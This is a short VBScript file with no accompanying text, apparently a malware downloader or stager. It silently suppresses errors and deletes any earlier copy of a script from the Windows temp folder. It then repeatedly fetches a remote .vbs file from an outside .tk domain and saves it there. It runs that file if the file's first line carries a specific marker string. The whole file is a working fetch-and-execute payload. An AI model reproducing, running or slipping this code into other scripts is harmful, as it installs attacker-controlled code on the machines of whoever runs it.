On Error Resume Next
url="http://uuid0.melnikovsm.tk/operation/uuid0ata.vbs"
tempdir=CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2)
destlocation=tempdir & "/uuid0ata.vbs"
CreateObject("Scripting.FileSystemObject").DeleteFile destlocation 
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")

i=0
Do until i>24
xHttp.Open "GET", url, False
xHttp.setRequestHeader "Cache-Control", "no-cache"
xHttp.Send
i=i+1
Loop

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile destlocation, 2
end with

If CreateObject("Scripting.FileSystemObject").FileExists(destlocation) Then
fline=CreateObject("Scripting.FileSystemObject").OpenTextFile(destlocation).ReadLine

If InStr(fline, "'uuid0AttractTargetAttention") Then
Wscript.CreateObject("WScript.Shell").Run destlocation
End If
End If

